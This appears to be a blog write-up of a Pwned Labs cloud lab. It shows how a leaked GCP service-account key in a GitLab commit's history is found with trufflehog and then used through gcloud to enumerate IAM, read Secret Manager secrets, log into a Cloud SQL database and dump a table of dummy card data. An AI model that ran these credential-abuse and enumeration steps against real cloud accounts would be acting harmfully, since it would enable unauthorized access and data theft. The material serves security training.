---
title: Gain Entry to GCP via GitLab Commit
description: Gain Entry to GCP via GitLab Commit 
image:
  path: gcp.png
categories:
- Pwned Labs
- GCP
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/gcp/
tags:
- pwnedlabs
- gcp
- cloud
---
# Scenario
On an external engagement for our new client, the global company Gigantic Retail, your team has identified a public GitLab repository. Can you check it out, and look for a way into their cloud environment?

# Walkthrough
We are given url to repository `https://gitlab.com/gigantic-retail/dev-site`. 

![](gain-entry-to-gcp-via-gitlab-commit-1.png)

Inside we find `upload.php` which seems to be using `token.json` file which stores GCP credentials. According to comment, it's stored outside of web root.

![](gain-entry-to-gcp-via-gitlab-commit-2.png)


We see multiple commits. We can see that after merging, there's a `Fix` commit

![](gain-entry-to-gcp-via-gitlab-commit-3.png)

If we click `Fix` commit, we find that developer accidently pushed service account key file and then removed it.

![](gain-entry-to-gcp-via-gitlab-commit-4.png)

We can click `View file @ 8e0d068e` and download it.

![](gain-entry-to-gcp-via-gitlab-commit-5.png)

Another way to detect the following key is to use automated tools like:
- [https://github.com/gitleaks/gitleaks](https://github.com/gitleaks/gitleaks)
- [https://github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog)
- [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

Let's try using `trufflehog`
```
└─$ trufflehog git https://gitlab.com/gigantic-retail/dev-site
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2025-08-20T00:02:47+06:00       info-0  trufflehog      running source  {"source_manager_worker_id": "kzzXo", "with_units": true}
2025-08-20T00:02:47+06:00       info-0  trufflehog      scanning repo   {"source_manager_worker_id": "kzzXo", "unit_kind": "dir", "unit": "/tmp/trufflehog-13430-4029511530", "repo": "https://gitlab.com/gigantic-retail/dev-site"}
✅ Found verified result 🐷🔑
Detector Type: GCP
Decoder Type: PLAIN
Raw result: appdev@gr-proj-1.iam.gserviceaccount.com
Project: gr-proj-1
Private_key_id: 06c67689ccfcc4337ffa0d97e1550ea911d45de1
Rotation_guide: https://howtorotate.com/docs/tutorials/gcp/
Commit: 5dd2511b74c5b1fff666cab6a79f4604a9789a0e
Email: Sara Lopez <sara@gigantic-retail.com>
File: storage/token.json
Line: 6
Repository: https://gitlab.com/gigantic-retail/dev-site
Timestamp: 2024-01-09 00:03:47 +0000
Analyze: Run `trufflehog analyze` to analyze this key's permissions
                                                                                                                                                                                                                
Found unverified result 🐷🔑❓
Detector Type: PrivateKey
Decoder Type: PLAIN
Raw result: -----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDZ7n6jvXwSoM3/                                                                                                                                                <REDACTED>                                                                                                                                                                                           
-----END PRIVATE KEY-----
Commit: 5dd2511b74c5b1fff666cab6a79f4604a9789a0e
Email: Sara Lopez <sara@gigantic-retail.com>
File: storage/token.json
Line: 1
Repository: https://gitlab.com/gigantic-retail/dev-site
Timestamp: 2024-01-09 00:03:47 +0000
                                                                                                                                                                                                                                            
2025-08-20T00:02:48+06:00       info-0  trufflehog      finished scanning       {"chunks": 52, "bytes": 283132, "verified_secrets": 1, "unverified_secrets": 1, "scan_duration": "8.33483587s", "trufflehog_version": "3.90.5", "verification_caching": {"Hits":0,"Misses":3,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":3003}}

```

Now, we can use Google Cloud CLI to authenticate using found credentials
```
└─$ gcloud auth activate-service-account --key-file=token.json
Activated service account credentials for: [appdev@gr-proj-1.iam.gserviceaccount.com]

```

We can confirm that key file is valid and we can print Google account our CLI is currently configured to use
```
└─$ gcloud config list account
[core]
account = appdev@gr-proj-1.iam.gserviceaccount.com

Your active configuration is: [default]
```

We can try listing the content of the bucket which we saw in `upload.php`
```
└─$ gsutil ls gs://gr-web  
gs://gr-web/products/
```
```
└─$ gcloud storage ls gs://gr-web --project=gr-proj-1
gs://gr-web/products/
```
```                        
└─$ gcloud storage ls gs://gr-web                    
gs://gr-web/products/
```

Let's check the folder
```
└─$ gsutil ls gs://gr-web/products
gs://gr-web/products/
```
```
└─$ gcloud storage ls gs://gr-web/products/
gs://gr-web/products/

gs://gr-web/products/:
gs://gr-web/products/
```
```
└─$ gcloud storage ls gs://gr-web/products/ --project=gr-proj-1
gs://gr-web/products/

gs://gr-web/products/:
gs://gr-web/products/
```

Nothing. Let's check IAM policies within `gr-proj-1`. In GCP, IAM policies can be attached at various levels of the resource hierarchy, such as organizations, folders, projects, and individual resources.
```
└─$ gcloud projects get-iam-policy gr-proj-1
bindings:
- members:
  - serviceAccount:internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomAppDevRole
- members:
  - serviceAccount:sv1-337@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomFrontendAppDevRole
- members:
  - serviceAccount:bucketviewer@gr-proj-1.iam.gserviceaccount.com
  - serviceAccount:frontend-dev-buckets@gr-proj-1.iam.gserviceaccount.com
  - serviceAccount:sv3-939@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomRole
- members:
  - serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomRole178
- members:
  - serviceAccount:setmetadata@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomRole353
- members:
  - serviceAccount:setmetadata@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomRole44
- members:
  - serviceAccount:devops-re@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomRole606
- members:
  - serviceAccount:sv3-939@gr-proj-1.iam.gserviceaccount.com
  role: projects/gr-proj-1/roles/CustomRole829
- members:
  - serviceAccount:service-212055223570@gcp-gae-service.iam.gserviceaccount.com
  role: roles/appengine.serviceAgent
- members:
  - serviceAccount:service-212055223570@gcp-sa-artifactregistry.iam.gserviceaccount.com
  role: roles/artifactregistry.serviceAgent
- members:
  - serviceAccount:212055223570@cloudbuild.gserviceaccount.com
  role: roles/cloudbuild.builds.builder
- members:
  - serviceAccount:service-212055223570@gcp-sa-cloudbuild.iam.gserviceaccount.com
  role: roles/cloudbuild.serviceAgent
- members:
  - serviceAccount:service-212055223570@gcf-admin-robot.iam.gserviceaccount.com
  role: roles/cloudfunctions.serviceAgent
- members:
  - serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
  role: roles/cloudsql.client
- members:
  - serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
  - serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
  role: roles/cloudsql.viewer
- members:
  - serviceAccount:service-212055223570@compute-system.iam.gserviceaccount.com
  role: roles/compute.serviceAgent
- members:
  - serviceAccount:service-212055223570@container-engine-robot.iam.gserviceaccount.com
  role: roles/container.serviceAgent
- members:
  - serviceAccount:service-212055223570@containerregistry.iam.gserviceaccount.com
  role: roles/containerregistry.ServiceAgent
- members:
  - serviceAccount:212055223570-compute@developer.gserviceaccount.com
  - serviceAccount:212055223570@cloudservices.gserviceaccount.com
  - serviceAccount:gr-proj-1@appspot.gserviceaccount.com
  role: roles/editor
- members:
  - serviceAccount:service-212055223570@firebase-rules.iam.gserviceaccount.com
  role: roles/firebaserules.system
- members:
  - serviceAccount:service-212055223570@gcp-sa-firestore.iam.gserviceaccount.com
  role: roles/firestore.serviceAgent
- members:
  - serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
  - serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
  - serviceAccount:internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com
  role: roles/iam.roleViewer
- members:
  - serviceAccount:setmetadata@gr-proj-1.iam.gserviceaccount.com
  role: roles/iam.serviceAccountUser
- members:
  - user:ayush@pwnedlabs.io
  - user:ian@pwnedlabs.io
  role: roles/owner
- members:
  - serviceAccount:service-212055223570@gcp-sa-pubsub.iam.gserviceaccount.com
  role: roles/pubsub.serviceAgent
- members:
  - serviceAccount:service-212055223570@cloud-redis.iam.gserviceaccount.com
  role: roles/redis.serviceAgent
- members:
  - serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
  role: roles/secretmanager.secretAccessor
- members:
  - serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
  role: roles/source.reader
etag: BwYRmwH25Ns=
version: 1

```

We can use [this script](https://raw.githubusercontent.com/hac01/iam-policy-visualize/main/main.py) to visualize the policy we extracted. But it requires JSON file, so first we need to convert policies from YML to JSON. We can use the following snippet
```
import yaml
import json

with open('policy.yml', 'r') as file:
    configuration = yaml.safe_load(file)

with open('policy.json', 'w') as json_file:
    json.dump(configuration, json_file, indent=2)
```

We also need to install `graphviz` and 
```
apt-get install graphviz
pip3 install graphviz
```

Run the visualizer
```
└─$ python3 visualize-policy.py policy.json          
IAM Policy visualization saved as /home/kali/pwnedlabs/gcp/iam_policy_graph.png
```

We got our graph

![](gain-entry-to-gcp-via-gitlab-commit-6.png)


We can see that our user (`appdev@gr-proj-1.iam.gserviceaccount.com`) has multiple roles, such as:
- `roles/secretmanager.secretAccessor`
- `roles/cloudsql.viewer`
- `roles/cloudsql.client`
- `projects/gr-proj-1/roles/CustomRole178`
- `roles/firestore.serviceAgent`

![](gain-entry-to-gcp-via-gitlab-commit-7.png)


We could also use the following command to enumerate the roles assigned to current user
```
└─$ gcloud projects get-iam-policy gr-proj-1 --flatten="bindings[].members" --format='table(bindings.role, bindings.members)' --filter="bindings.members:appdev@gr-proj-1.iam.gserviceaccount.com"
ROLE                                    MEMBERS
projects/gr-proj-1/roles/CustomRole178  serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
roles/cloudsql.client                   serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
roles/cloudsql.viewer                   serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
roles/iam.roleViewer                    serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
roles/secretmanager.secretAccessor      serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com
                                                                                                  
```

Let's continue by enumerating `CustomRole178`. We can use [permissions.cloud](https://gcp.permissions.cloud/predefinedroles) to look up the permissions included in custom roles.
```
└─$ gcloud iam roles describe CustomRole178 --project=gr-proj-1
description: 'Created on: 2024-01-05'
etag: BwYOd_bj0ew=
includedPermissions:
- iam.serviceAccounts.getIamPolicy
- iam.serviceAccounts.list
- resourcemanager.projects.get
- resourcemanager.projects.getIamPolicy
- secretmanager.locations.get
- secretmanager.locations.list
- secretmanager.secrets.get
- secretmanager.secrets.getIamPolicy
- secretmanager.secrets.list
- secretmanager.versions.get
- secretmanager.versions.list
- storage.buckets.get
- storage.managedFolders.get
- storage.managedFolders.list
- storage.multipartUploads.list
- storage.objects.get
- storage.objects.list
name: projects/gr-proj-1/roles/CustomRole178
stage: ALPHA
title: AppDevRole

```

Seems like we have access to retrieve IAM policy details about the GCP project and service accounts, also read access to Secret Manager. Let's list secrets stored in the project
```
└─$ gcloud secrets list --project=gr-proj-1
NAME                    CREATED              REPLICATION_POLICY  LOCATIONS
customer-app-backend    2024-01-11T13:44:58  automatic           -
retail-db-backup-clone  2024-01-05T13:30:26  automatic           -
```

We can retrieve the secrets
```
└─$ gcloud secrets versions access latest --secret=retail-db-backup-clone --project=gr-proj-1
appdev:<REDACTED>                                                                                                                                                                              ```
```     
```                                                 
└─$ gcloud secrets versions access latest --secret=customer-app-backend --project=gr-proj-1
DB_USER=DB_CONNECT
DB_PASS=<REDACTED>  
```

We retrieved credentials from  retail database clone, which could be related to SQL database (since we also had `cloudsql` roles assigned to service account). We can list sql instances
```
└─$ gcloud sql instances list --project=gr-proj-1
NAME                       DATABASE_VERSION  LOCATION       TIER         PRIMARY_ADDRESS  PRIVATE_ADDRESS  STATUS
gigantic-retail-backup-db  MYSQL_8_0_31      us-central1-b  db-f1-micro  34.134.161.125   -                RUNNABLE
customer-app-1             POSTGRES_15       us-central1-f  db-f1-micro  34.31.83.80      -                RUNNABLE

```

We can connect to `gigantic-retail-backup-db` using credentials we found in `retail-db-backup-clone`
```
└─$ mysql -h 34.134.161.125 -u appdev -p --ssl-verify-server-cert=False
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1210710
Server version: 8.0.31-google (Google)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

```

We can start enumerating the database
```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| GlobalSalesData    |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.221 sec)

MySQL [(none)]> use GlobalSalesData;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [GlobalSalesData]> show tables;
+---------------------------+
| Tables_in_GlobalSalesData |
+---------------------------+
| CustomerOrders            |
+---------------------------+
1 row in set (0.213 sec)

```

We find our flag in the `CustomerOrders` table
```
MySQL [GlobalSalesData]> select * from CustomerOrders;
+---------+------------------+---------------------------------+-----------+----------+------------+-------------+------------+---------------------------------------------+---------------+---------------------+---------+------------+
| OrderID | CustomerName     | CustomerEmail                   | ProductID | Quantity | OrderDate  | OrderStatus | TotalPrice | ShippingAddress                             | PaymentMethod | CreditCardNumber    | CVVCode | ExpiryDate |
+---------+------------------+---------------------------------+-----------+----------+------------+-------------+------------+---------------------------------------------+---------------+---------------------+---------+------------+
|    1001 | Emily Johnson    | emily.johnson@broadnet.co       |       101 |        1 | 2023-01-15 | Delivered   |      49.99 | 742 Evergreen Terrace, Springfield, OR      | Visa          | 4929 8765 1234 5678 | 123     | 2024-06-30 |
<SNIP>
|    1021 | Flag             | chad.taylor@mailservice.co      |       120 |        2 | 2023-02-03 | Delivered   |     199.98 | <REDACTED>            | Discover      | 6011 9012 3456 7890 | 234     | 2025-01-30 |
+---------+------------------+---------------------------------+-----------+----------+------------+-------------+------------+---------------------------------------------+---------------+---------------------+---------+------------+
21 rows in set (0.265 sec)

MySQL [GlobalSalesData]> 
```